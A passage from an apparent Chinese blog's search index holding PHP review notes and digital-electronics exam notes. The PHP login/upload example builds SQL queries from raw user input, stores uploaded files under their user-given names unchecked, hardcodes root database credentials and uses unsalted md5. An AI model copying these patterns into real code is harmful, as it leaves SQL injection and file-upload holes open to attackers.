class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">multiple</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multiple<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>q[]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>//多选        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>选择一个站点:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>RUNOOB<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Runoob<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GOOGLE<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Google<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TAOBAO<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Taobao<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>q<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>//单选        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>选择一个站点:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>RUNOOB<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Runoob<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>GOOGLE<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Google<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>option</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>TAOBAO<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Taobao<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>option</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>abc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'islogin'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location:info.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'abc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$pass</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"mysql:host=localhost;dbname=ylndb"</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'123456'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"select * from user where userid='<span class="token interpolation"><span class="token variable">$user</span></span>' and password='<span class="token interpolation"><span class="token variable">$pass</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"upload/"</span> <span class="token punctuation">.</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//传文件</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'islogin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$user</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$pass</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location:info.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location:index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>info.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'session.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$pass</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$dbservername</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"localhost"</span><span class="token punctuation">;</span><span class="token variable">$dbusername</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$dbpassword</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"123456"</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"ylndb"</span><span class="token punctuation">;</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"mysql:host=<span class="token interpolation"><span class="token variable">$dbservername</span></span>;dbname=<span class="token interpolation"><span class="token variable">$dbname</span></span>"</span><span class="token punctuation">,</span> <span class="token variable">$dbusername</span><span class="token punctuation">,</span> <span class="token variable">$dbpassword</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);</span><span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"select * from user where userid='<span class="token interpolation"><span class="token variable">$user</span></span>' and password='<span class="token interpolation"><span class="token variable">$pass</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$stmt->execute();</span><span class="token comment">//    $stmt->setFetchMode(PDO::FETCH_ASSOC);</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$stmt</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;a href="out.php">out&lt;/a>'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>session.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//开启session</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'islogin'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Location: index.php?2333'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span>out.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'location:index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">redfilefilefile_get_contents1．从文件中读取数据    从文件中读取数据，可以读取一个字符、一行字串或整个文件，还可以读取任意长度的字串。1）读取整个文件：readfile()、file()和file_get_contents()（1）readfile()函数       readfile()函数用于读入一个文件并将其写入到输出缓冲，如果出现错误则返回false。函数语法如下：int readfile(string filename)      使用readfile()函数，不需要打开&#x2F;关闭文件，不需要echo&#x2F;print等输出语句，直接写出文件路径即可。（2）file()函数        file()函数也可以读取整个文件的内容，只是file()函数将文件内容按行存放到数组中，包括换行符在内。如果失败则返回false。函数语法如下：array file(string filename)（3）file_get_contents()函数      该函数将文件内容（filename）读入失一个字符串。如果有offset和maxlen参数，将在参数offset所指定的位置开始读取长度为maxlen的内容。如果败，返回false。函数语法如下：string file_get_contents(string filename[,int offset[,int maxlen]])该函数适用于二进制对象，是将整个文件的内容读入到一个字符串中的首选方式。 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1><p><strong>scandir</strong></p><p>数组方式列出 images 目录中的文件和目录</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">p<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"/images/"</span><span class="token punctuation">;</span><span class="token comment">// Sort in ascending order - this is default</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Sort in descending order，降序</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">scandir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>is_dir</strong></p><p>is_dir() 函数检查指定的文件是否是一个目录。</p><p>如果目录存在，该函数返回 TRUE。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"images"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$file</span></span> is a directory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$file</span></span> is not a directory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>三大特点：封装性，继承性，多态性</p><p>定义类需要在一个PHP区块中</p><p>析构函数的特殊性：（void __destruct(void)）</p><ul><li>PHP使用一种“垃圾回收”机制，自动清理不再使用的对象，析构函数会自动被调用，释放内存。</li><li>对象被销毁时被调用（和构造方法相反），作用释放内存。</li></ul><p>$this-&gt;和::</p><ul><li>$this-&gt;表示实例化后调用具体对象</li><li>::用来直接调用类中的属性或方法，没有实例化</li></ul><p>使用::的格式：关键字::变量名/常量名/方法名，这里的关键字：</p><ul><li>parent：可以调用父类中的成员变量、常量，成员方法</li><li>self：可以调用当前类中的静态成员和常量</li><li>类名：可以调用该类的变量、常量、方法</li></ul><p>对象成员访问符号</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">-&gt; 是对象成员访问符号 &#x2F;&#x2F;区分 &#x3D;&gt; 是数组成员访问符号<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>魔术方法：*get/*set;_call</p><p>php面向对象中的public protected private 的含义，以及final关键字的含义</p><ul><li><p>public：公开的，可以在程序的任何位置（类内、类外）被其它类和对象调用</p></li><li><p>private：只能在所属类的内部被调用和修改，不可以在类外被访问</p></li><li><p>protected：可在本类和子类被调用，其它地方不可被调用</p></li><li><p>final：被final修饰的类不能被继承，修饰的方法不能重写也不能覆盖</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数电</title>
      <link href="2021/04/19/%E6%95%B0%E7%94%B5/"/>
      <url>2021/04/19/%E6%95%B0%E7%94%B5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>数电大题基本固定，弄会就没啥问题了</p><h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><h2 id="一些应用"><a href="#一些应用" class="headerlink" title="一些应用"></a>一些应用</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210605113057712.png" alt="image-20210605113057712" loading="lazy"></p><h2 id="模拟与数字"><a href="#模拟与数字" class="headerlink" title="模拟与数字"></a>模拟与数字</h2><ul><li><p>模拟信号：时间上和幅度上都<strong>连续</strong>变化的信号</p></li><li><p>数字信号：时间上和幅度上都<strong>断续</strong>变化的信号</p></li><li><p>数字逻辑电路研究的两大任务是:<strong>分析、设计</strong></p></li><li><p>根据一个电路有无记忆功能，数字逻辑电路可以分为<strong>组合逻辑电路</strong>和<strong>时序逻辑电路</strong>两种类型。</p></li></ul><h1 id="二、数制与码制"><a href="#二、数制与码制" class="headerlink" title="二、数制与码制"></a>二、数制与码制</h1><h2 id="进制转换（应该都会吧）"><a href="#进制转换（应该都会吧）" class="headerlink" title="进制转换（应该都会吧）"></a>进制转换（应该都会吧）</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210605114143612.png" alt="image-20210605114143612" loading="lazy"></p><h2 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h2><ul><li>编码：按一定的方式将0、1数码进行编排来表示特定的含义,这种方式称为编码。</li><li>用4位_二进制数来表示1位十进制数的代码,称为BCD码。</li><li>格雷码，余三码都是无权码。</li></ul><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210605114436414.png" alt="image-20210605114436414" loading="lazy"></p><h3 id="二-十进制码"><a href="#二-十进制码" class="headerlink" title="二-十进制码"></a>二-十进制码</h3><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210605114627618.png" alt="image-20210605114627618" loading="lazy"></p><h3 id="奇偶校验码"><a href="#奇偶校验码" class="headerlink" title="奇偶校验码"></a>奇偶校验码</h3><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210605131631714.png" alt="image-20210605131631714" loading="lazy"></p><h3 id="格雷码"><a href="#格雷码" class="headerlink" title="格雷码"></a>格雷码</h3><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210605131659789.png" alt="image-20210605131659789" loading="lazy"></p><h2 id="原码、反码和补码"><a href="#原码、反码和补码" class="headerlink" title="原码、反码和补码"></a>原码、反码和补码</h2><p>原码：二进制数。符号部分用0表示“+”， 用1表示“-”</p><p>反码：正数与原码相同，负数就是各位取反（除符号位）。</p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210605133155190.png" alt="image-20210605133155190" loading="lazy"></p><p>补码：正数与原码相同，负数就是反码基础上末尾加1（符号位不变）。</p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210606002509311.png" alt="image-20210606002509311" loading="lazy"></p><h2 id="一些题目以及详解"><a href="#一些题目以及详解" class="headerlink" title="一些题目以及详解"></a>一些题目以及详解</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210608233949955.png" alt="image-20210608233949955" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210608234023034.png" alt="image-20210608234023034" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210608234044547.png" alt="image-20210608234044547" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210608234106581.png" alt="image-20210608234106581" loading="lazy"></p><h1 id="三、逻辑代数基础"><a href="#三、逻辑代数基础" class="headerlink" title="三、逻辑代数基础"></a>三、逻辑代数基础</h1><ul><li>同一逻辑问题分别用正负逻辑定义其输入与输出之间的逻辑代数式，则这两个逻辑代数式之间的关系为对偶。</li><li></li></ul><h2 id="逻辑符号对照（这个要看的懂会画）"><a href="#逻辑符号对照（这个要看的懂会画）" class="headerlink" title="逻辑符号对照（这个要看的懂会画）"></a>逻辑符号对照（这个要看的懂会画）</h2><p>与，或，非，异或。</p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210607010305035.png" alt="image-20210607010305035" loading="lazy"></p><h2 id="逻辑代数的基本定律"><a href="#逻辑代数的基本定律" class="headerlink" title="逻辑代数的基本定律"></a>逻辑代数的基本定律</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210607010734760.png" alt="image-20210607010734760" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210607010748653.png" alt="image-20210607010748653" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210607010851110.png" alt="image-20210607010851110" loading="lazy"></p><h2 id="逻辑函数的表示"><a href="#逻辑函数的表示" class="headerlink" title="逻辑函数的表示"></a>逻辑函数的表示</h2><ul><li>真值表</li><li>逻辑图</li><li>卡诺图</li><li>逻辑代数式</li></ul><p>最小项（与或式），最大项（或与式）</p><h3 id="重要规则"><a href="#重要规则" class="headerlink" title="重要规则"></a>重要规则</h3><p>代入规则</p><p>反演规则：运算顺序不变，+变*，变量取反</p><p>对偶规则：运算顺序不变，+变*</p><h2 id="逻辑函数的化简方法"><a href="#逻辑函数的化简方法" class="headerlink" title="逻辑函数的化简方法"></a>逻辑函数的化简方法</h2><h3 id="公式法化简"><a href="#公式法化简" class="headerlink" title="公式法化简"></a>公式法化简</h3><ul><li>并项法</li></ul><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210607012517276.png" alt="image-20210607012517276" loading="lazy"></p><ul><li>吸收法</li></ul><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210607012545593.png" alt="image-20210607012545593" loading="lazy"></p><ul><li>消去法</li></ul><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210607012610883.png" alt="image-20210607012610883" loading="lazy"></p><ul><li>配项法</li></ul><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210607012622099.png" alt="image-20210607012622099" loading="lazy"></p><ul><li>以上方法综合运用</li></ul><h3 id="卡诺图化简"><a href="#卡诺图化简" class="headerlink" title="卡诺图化简"></a>卡诺图化简</h3><p>不再累述，注意几点。</p><ul><li>包围圈要越大越少。</li><li>包围圈圈的数目为（1，2，4，8……2^n）</li><li>同一列最上边和最下边循环相邻，可画圈；       </li><li>同一行最左边和最右边循环相邻，可画圈；</li><li>四个角上的 1 （或0）方格也循环相邻，可画圈。 </li><li>注意无关项。（和正常画法是一样的）</li><li>化简成最简与或式对”1“画包围圈。</li><li>化简成最简或与式对”0“画包围圈。</li></ul><h2 id="一些题目以及详解-1"><a href="#一些题目以及详解-1" class="headerlink" title="一些题目以及详解"></a>一些题目以及详解</h2><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609000208323.png" alt="image-20210609000208323" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609000219999.png" alt="image-20210609000219999" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609000250191.png" alt="image-20210609000250191" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609000318137.png" alt="image-20210609000318137" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609000331189.png" alt="image-20210609000331189" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609000349331.png" alt="image-20210609000349331" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609000404083.png" alt="image-20210609000404083" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609005958127.png" alt="image-20210609005958127" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010007518.png" alt="image-20210609010007518" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010027691.png" alt="image-20210609010027691" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010038910.png" alt="image-20210609010038910" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010052606.png" alt="image-20210609010052606" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010108445.png" alt="image-20210609010108445" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010122974.png" alt="image-20210609010122974" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010130045.png" alt="image-20210609010130045" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010145593.png" alt="image-20210609010145593" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010216822.png" alt="image-20210609010216822" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010227985.png" alt="image-20210609010227985" loading="lazy"></p><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210609010247731.png" alt="image-20210609010247731" loading="lazy"></p><h1 id="四、VHDL"><a href="#四、VHDL" class="headerlink" title="四、VHDL"></a>四、VHDL</h1><ul><li>VHDL是超高速集成电路硬件描述语言</li><li>进程中的变量赋值语句,其变量赋值是立即完成的</li><li>变量赋值( :=)：立即赋值</li><li>信号赋值(&lt;=)：在进程的最后才对信号赋值</li><li>当在同一进程中，同一信号赋值目标有多个赋值源时，信号赋值目标获得的是最后一个赋值源的赋值</li><li>相对于传统的软件描述语言，并行语句结构是最具VHDL特色的</li><li>顺序语句：IF,CASE,LOOP,NEXT,EXIT,WAIT,RETURN,NULL</li><li>简单信号赋值语句、条件信号赋值语句和选择信号赋值语句。<br> 这三种信号赋值语句的共同点是：赋值目标必须都是信号。</li><li>VHDL的描述方式有行为描述、数据流描述和结构描述。</li><li>一个设计实体可以拥有一个或多个结构体。</li><li>VHDL语言结构由库，程序包，实体，结构体，配置5个部分组成</li></ul><p><img src="/2021/04/19/%E6%95%B0%E7%94%B5/image-20210608003914653.png" alt="image-20210608003914653" loading="lazy"></p><h1 id="六、组合逻辑电路"><a href="#六、组合逻辑电路" 